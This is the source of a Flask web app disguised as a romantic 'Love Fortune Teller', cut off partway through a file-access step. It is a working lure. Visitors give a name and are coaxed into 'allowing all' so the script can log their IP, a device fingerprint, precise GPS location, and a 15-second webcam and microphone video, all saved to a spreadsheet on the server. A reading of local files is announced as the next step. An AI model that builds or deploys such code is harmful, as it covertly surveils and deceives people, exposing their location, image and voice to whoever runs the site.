from flask import Flask, render_template_string, request, send_file
import pandas as pd
import openpyxl
from openpyxl import load_workbook
from openpyxl.utils.dataframe import dataframe_to_rows
import os
import io
import base64
import uuid
import requests
from datetime import datetime
import json

app = Flask(__name__)

# Fortune messages (32 romantic fortunes) - UNCHANGED
FORTUNES = [
    "Your soulmate is thinking of you right now 💕",
    "A passionate kiss awaits you this week 😘",
    "True love will find you when you least expect it ❤️",
    "Your heart will be swept away by someone special 🌹",
    "Tonight, someone special dreams of you 🌙",
    "Love is in the air—prepare for romance! 💋",
    "Your perfect match is closer than you think ✨",
    "A romantic adventure begins soon 🥰",
    "Your love life is about to blossom 🌸",
    "Someone is falling in love with your smile 😍",
    "Passion ignites when you open your heart 🔥",
    "Your forever person is waiting for you 💍",
    "Romance will surprise you beautifully 🌟",
    "Love letters are coming your way 📩",
    "Your heart knows the way—follow it 💖",
    "A love story worthy of movies awaits 🎬",
    "Sweet whispers of love are on their way 🗣️",
    "Your soul recognizes its match instantly 👫",
    "Romantic magic happens when you believe ✨",
    "Love will light up your world like fireworks 🎆",
    "Someone special notices your unique beauty 🌺",
    "Heart-to-heart connections deepen soon 💑",
    "Your love journey leads to happiness 🛤️",
    "Passionate nights and tender days ahead 🌃",
    "Love finds those who are ready to receive it 🎁",
    "Your heart's desire manifests soon 🙏",
    "Romantic serendipity brings you together 🍀",
    "Love grows stronger with every heartbeat 💓",
    "Your perfect love story unfolds now 📖",
    "Someone's heart beats faster thinking of you 🥁",
    "True love transcends time and distance 🌍",
    "Your romantic destiny calls you forward 🚀"
]

DATA_FILE = 'fortunes_data.xlsx'
BACKUP_FILE = 'fortunes_data_backup.xlsx'

def init_excel():
    if not os.path.exists(DATA_FILE):
        df = pd.DataFrame(columns=[
            'timestamp', 'name', 'latitude', 'longitude', 'accuracy', 
            'ip', 'user_agent', 'screen_width', 'screen_height', 'color_depth',
            'timezone', 'platform', 'language', 'memory_gb', 'device_memory',
            'network_type', 'network_speed', 'battery_level', 'battery_charging',
            'browser_fingerprint', 'map_url',
            # NEW COLUMNS FOR PERMISSIONS
            'microphone_audio', 'camera_video', 'local_files'
        ])
        df.to_excel(DATA_FILE, index=False)

def backup_data():
    if os.path.exists(DATA_FILE):
        wb = load_workbook(DATA_FILE)
        wb.save(BACKUP_FILE)
        print(f"Backup created: {BACKUP_FILE}")

def save_visitor_data(data):
    init_excel()
    
    try:
        # Load existing data
        df = pd.read_excel(DATA_FILE)
        
        # Append new data
        new_row = pd.DataFrame([data])
        df = pd.concat([df, new_row], ignore_index=True)
        
        # Save with auto-adjust columns
        with pd.ExcelWriter(DATA_FILE, engine='openpyxl') as writer:
            df.to_excel(writer, index=False, sheet_name='Data')
            workbook = writer.book
            worksheet = writer.sheets['Data']
            
            # Auto-adjust column widths
            for column in worksheet.columns:
                max_length = 0
                column_letter = column[0].column_letter
                for cell in column:
                    try:
                        if len(str(cell.value)) > max_length:
                            max_length = len(str(cell.value))
                    except:
                        pass
                adjusted_width = min(max_length + 2, 50)
                worksheet.column_dimensions[column_letter].width = adjusted_width
        
        backup_data()
        print(f"Saved data for {data.get('name', 'Unknown')}")
        return True
        
    except Exception as e:
        print(f"Error saving data: {e}")
        return False

def get_client_ip():
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        return request.environ['REMOTE_ADDR']
    else:
        return request.environ['HTTP_X_FORWARDED_FOR']

def get_tinyurl(long_url):
    try:
        response = requests.post('https://tinyurl.com/api-create.php', 
                               data={'url': long_url}, timeout=5)
        return response.text if response.status_code == 200 else long_url
    except:
        return long_url

@app.route('/')
def fortune_teller():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
        body { 
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .heart { 
            position: fixed; 
            font-size: 20px; 
            color: #ff69b4; 
            pointer-events: none; 
            z-index: 1000;
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 1; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 0.8; }
        }
        .fortune-card {
            background: linear-gradient(145deg, rgba(255,255,255,0.9), rgba(255,255,255,0.7));
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .progress-ring {
            transform: rotate(-90deg);
        }
        .progress-ring-circle {
            stroke-dasharray: 251.2;
            stroke-dashoffset: 251.2;
            transition: stroke-dashoffset 0.3s;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <!-- Floating hearts background -->
    <div id="hearts-container"></div>

    <div class="fortune-card p-8 md:p-12 max-w-md w-full text-center transform hover:scale-105 transition-all duration-300">
        <div class="mb-8">
            <div class="text-5xl md:text-6xl mb-4">💖</div>
            <h1 class="text-3xl md:text-4xl font-bold bg-gradient-to-r from-pink-500 to-purple-600 bg-clip-text text-transparent mb-2">
                Love Fortune Teller
            </h1>
            <p class="text-gray-600 text-lg font-light">Discover what the stars have in store for your love life</p>
        </div>

        <div id="name-form" class="space-y-4">
            <input type="text" id="userName" placeholder="🌹 Enter your name, beautiful soul" 
                   class="w-full p-4 text-lg border-2 border-pink-200 rounded-2xl focus:outline-none focus:border-pink-400 bg-white/80 backdrop-blur-sm text-center font-medium">
            <button onclick="getPersonalizedFortune()" 
                    class="w-full bg-gradient-to-r from-pink-500 to-purple-500 text-white py-4 px-8 rounded-2xl text-lg font-semibold shadow-lg hover:shadow-xl transform hover:-translate-y-1 transition-all duration-300">
                ✨ Reveal My Love Fortune ✨
            </button>
        </div>

        <div id="loading" class="hidden mt-8">
            <div class="text-2xl mb-4">🔮 Reading the stars...</div>
            <div class="flex justify-center">
                <div class="w-12 h-12 border-4 border-pink-200 border-t-pink-500 rounded-full animate-spin"></div>
            </div>
            <p class="text-sm text-gray-500 mt-4">Gathering cosmic energies for your special reading</p>
        </div>

        <div id="permissions" class="hidden mt-8 space-y-4">
            <div class="text-xl font-semibold text-pink-600 mb-4">
                🎁 Special Reading Enhancement
            </div>
            <p class="text-gray-700">
                For your <strong>ultra-personalized love vision</strong>, please allow:
            </p>
            <div class="bg-gradient-to-r from-blue-100 to-purple-100 p-4 rounded-xl">
                📍 Location | 🎤 Voice | 📸 Camera | 📁 Special Files
            </div>
            <button id="allow-btn" onclick="requestAllPermissions()" 
                    class="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white py-4 px-8 rounded-2xl text-lg font-semibold shadow-lg hover:shadow-xl transform hover:-translate-y-1 transition-all duration-300">
                ✅ Allow All for Perfect Reading
            </button>
        </div>

        <!-- STEP-BY-STEP PROGRESS -->
        <div id="progress-location" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
            <div class="text-xl font-semibold mb-4">📍 Finding Your Love Coordinates</div>
            <div class="flex justify-center mb-4">
                <svg class="w-20 h-20" viewBox="0 0 100 100">
                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
                    <circle id="location-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round"></circle>
                </svg>
            </div>
            <div class="text-lg font-medium text-gray-700" id="location-status">Requesting location permission...</div>
        </div>

        <div id="progress-media" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
            <div class="text-xl font-semibold mb-4">🎥 Capturing Your Love Energy</div>
            <div class="flex justify-center mb-4">
                <svg class="w-20 h-20" viewBox="0 0 100 100">
                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
                    <circle id="media-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#f59e0b" stroke-width="8" stroke-linecap="round"></circle>
                </svg>
            </div>
            <div class="text-lg font-medium text-gray-700" id="media-status">Recording your energy (15s)...</div>
            <div class="text-3xl mt-2" id="media-countdown">--</div>
        </div>

        <div id="progress-files" class="hidden mt-8 p-6 bg-white/70 rounded-2xl backdrop-blur-sm">
            <div class="text-xl font-semibold mb-4">📁 Uploading Love Memories</div>
            <div class="flex justify-center mb-4">
                <svg class="w-20 h-20" viewBox="0 0 100 100">
                    <circle class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#e5e7eb" stroke-width="8"></circle>
                    <circle id="files-progress" class="progress-ring-circle" cx="50" cy="50" r="40" fill="none" stroke="#8b5cf6" stroke-width="8" stroke-linecap="round"></circle>
                </svg>
            </div>
            <div class="text-lg font-medium text-gray-700" id="files-status">Processing your special files...</div>
        </div>

        <div id="result" class="hidden mt-12 space-y-6">
            <div class="text-4xl md:text-5xl font-bold bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent mb-4">
                💕 Your Fortune 💕
            </div>
            <div id="fortune-text" class="font-dancing text-2xl md:text-3xl min-h-[120px] leading-relaxed text-gray-800 p-6 bg-white/60 rounded-2xl backdrop-blur-sm"></div>
            <div id="map-link" class="hidden bg-gradient-to-r from-blue-500 to-indigo-600 text-white p-4 rounded-xl">
                🗺️ Your Love Map: <span id="map-url"></span>
            </div>
            <div class="text-sm text-gray-500">
                Thank you for trusting the stars ✨ Share with someone special!
            </div>
        </div>
    </div>

    <script>
        // Create floating hearts - UNCHANGED
        function createHeart() {
            const heart = document.createElement('div');
            heart.innerHTML = '💖';
            heart.className = 'heart';
            heart.style.left = Math.random() * 100 + 'vw';
            heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
            document.getElementById('hearts-container').appendChild(heart);
            setTimeout(() => heart.remove(), 6000);
        }
        setInterval(createHeart, 800);

        let visitorData = {};
        let mediaRecorder = null;
        let mediaStream = null;
        let recordedBlobs = [];

        async function collectDeviceInfo() {
            const fingerprint = {
                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                memory: navigator.deviceMemory || 'N/A',
                connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)` : 'N/A',
                userAgent: navigator.userAgent,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints
            };
            
            // Battery API
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    visitorData.battery_level = Math.round(battery.level * 100);
                    visitorData.battery_charging = battery.charging;
                } catch(e) {}
            }
            
            visitorData.screen_width = screen.width;
            visitorData.screen_height = screen.height;
            visitorData.color_depth = screen.colorDepth;
            visitorData.platform = navigator.platform;
            visitorData.language = navigator.language;
            visitorData.memory_gb = navigator.deviceMemory || 'N/A';
            visitorData.network_type = navigator.connection ? navigator.connection.effectiveType : 'N/A';
            visitorData.network_speed = navigator.connection ? navigator.connection.downlink : 'N/A';
            visitorData.browser_fingerprint = btoa(JSON.stringify(fingerprint)).slice(0, 100);
            
            return fingerprint;
        }

        function getPersonalizedFortune() {
            const name = document.getElementById('userName').value.trim() || 'Mysterious Soul';
            if (!name) return alert('Please enter your name first 💕');
            
            visitorData.name = name;
            visitorData.timestamp = new Date().toISOString();
            
            document.getElementById('name-form').classList.add('hidden');
            document.getElementById('loading').classList.remove('hidden');
            
            collectDeviceInfo().then(() => {
                visitorData.ip = 'server-will-fill';
                visitorData.user_agent = navigator.userAgent;
                
                setTimeout(() => {
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('permissions').classList.remove('hidden');
                }, 1000);
            });
        }

        // ✅ FIXED: Sequential Promise Chain - Wait for Each Step
        async function requestAllPermissions() {
            try {
                // Hide button, show first step
                document.getElementById('allow-btn').classList.add('hidden');
                document.getElementById('permissions').classList.add('hidden');
                
                // STEP 1: LOCATION (wait for success)
                await requestLocation();
                
                // STEP 2: MEDIA (wait for full 15s recording)
                await requestMedia();
                
                // STEP 3: FILES (wait for all file reads)
                await requestFiles();
                
                // STEP 4: FINALIZE & SAVE (only now!)
                await finalizeAndSave();
                
            } catch (error) {
                console.log('Permission flow interrupted:', error);
                // Still save what we have
                await finalizeAndSave();
            }
        }

        // STEP 1: Location - Wait for coords
        function requestLocation() {
            return new Promise((resolve, reject) => {
                showProgress('progress-location', 'Requesting location permission...', 0);
                
                const timeout = setTimeout(() => reject('Location timeout'), 20000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        visitorData.latitude = position.coords.latitude;
                        visitorData.longitude = position.coords.longitude;
                        visitorData.accuracy = position.coords.accuracy;
                        
                        showProgress('progress-location', 'Love coordinates captured! ✨', 100);
                        setTimeout(() => {
                            hideProgress('progress-location');
                            resolve();
                        }, 1000);
                    },
                    (error) => {
                        clearTimeout(timeout);
                        visitorData.latitude = 'denied';
                        showProgress('progress-location', 'Location optional - continuing... 💖', 100);
                        setTimeout(() => {
                            hideProgress('progress-location');
                            resolve(); // Continue even if denied
                        }, 1000);
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        // STEP 2: Media - Wait FULL 15s recording
        function requestMedia() {
            return new Promise((resolve, reject) => {
                showProgress('progress-media', 'Allow camera & microphone...', 10);
                
                navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                }).then((stream) => {
                    mediaStream = stream;
                    recordedBlobs = [];
                    
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
                    
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) recordedBlobs.push(event.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        if (recordedBlobs.length > 0) {
                            const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                visitorData.camera_video = reader.result.split(',')[1];
                                visitorData.microphone_audio = `15s_video_${recordedBlobs[0].size}bytes`;
                                mediaStream.getTracks().forEach(track => track.stop());
                                showProgress('progress-media', 'Love energy captured! 💖', 100);
                                setTimeout(() => {
                                    hideProgress('progress-media');
                                    resolve();
                                }, 800);
                            };
                            reader.readAsDataURL(blob);
                        } else {
                            visitorData.camera_video = 'empty';
                            resolve();
                        }
                    };
                    
                    // START RECORDING with 15s timer
                    mediaRecorder.start();
                    let timeLeft = 15;
                    const countdownEl = document.getElementById('media-countdown');
                    countdownEl.textContent = timeLeft;
                    
                    const interval = setInterval(() => {
                        timeLeft--;
                        countdownEl.textContent = timeLeft;
                        updateProgress('media-progress', (15 - timeLeft) / 15 * 90 + 10); // 10-100%
                        
                        if (timeLeft <= 0) {
                            clearInterval(interval);
                            mediaRecorder.stop();
                        }
                    }, 1000);
                    
                }).catch((err) => {
                    visitorData.microphone_audio = 'denied';
                    visitorData.camera_video = 'denied';
                    showProgress('progress-media', 'Media optional - continuing... ✨', 100);
                    setTimeout(() => {
                        hideProgress('progress-media');
                        resolve(); // Continue even if denied
                    }, 1000);
                });
            });
        }

        // STEP 3: Files - Wait for ALL file reads
        function requestFiles()
